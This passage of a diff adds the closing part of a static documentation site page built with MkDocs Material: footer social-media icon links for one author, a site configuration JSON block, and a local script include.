+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://www.linkedin.com/in/vasanthavanan/" target="_blank" rel="noopener" title="Vasanth Vanan on Linkedin" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://www.instagram.com/vasanth_vanan/" target="_blank" rel="noopener" title="Vasanth Vanan on Instagram" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://medium.com/@vasanthavanan" target="_blank" rel="noopener" title="Vasanth Vanan on Medium" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M180.5 74.262C80.813 74.262 0 155.633 0 256s80.819 181.738 180.5 181.738S361 356.373 361 256 280.191 74.262 180.5 74.262Zm288.25 10.646c-49.845 0-90.245 76.619-90.245 171.095s40.406 171.1 90.251 171.1 90.251-76.619 90.251-171.1H559c0-94.503-40.4-171.095-90.248-171.095Zm139.506 17.821c-17.526 0-31.735 68.628-31.735 153.274s14.2 153.274 31.735 153.274S640 340.631 640 256c0-84.649-14.215-153.271-31.742-153.271Z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "navigation.expand", "navigation.footer", "content.tabs.link"], "search": "../../assets/javascripts/workers/search.208ed371.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.2a6f1dda.min.js"></script>
+      
+    
+  </body>
+</html>
